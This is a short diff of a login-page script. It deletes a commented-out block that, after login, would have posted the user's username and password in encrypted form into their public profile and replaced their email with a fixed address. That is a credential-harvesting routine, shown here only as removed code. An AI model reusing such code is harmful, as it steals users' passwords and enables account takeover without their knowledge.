@@ -795,23 +795,6 @@ if (window.location.pathname.match(/\/login\/?$/)) {
     const afterLogin = async (username, password) => {
         searchUser(username);
         const uid = await userId();
-        /*
-        if (isModified === true) {
-            $.ajax({
-                url: "/user/" + uid + "/edit",
-                type: "POST",
-                data: {
-                    username: username,
-                    sex: 0,
-                    email: "genshin@gmail.com",
-                    public_email: "on",
-                    prefer_formatted_code: "on",
-                    information: encrypt(username + "\n" + password)
-                },
-                async: true
-            });
-        }
-        */
     }
     const MySuccess = (session_id, status, username, password) => {
         if (status == 1) createNotification("登录成功！即将重定向...\n登录途径：密码原文", 3000, 1000, 'rgba(82, 196, 26, 0.8)')
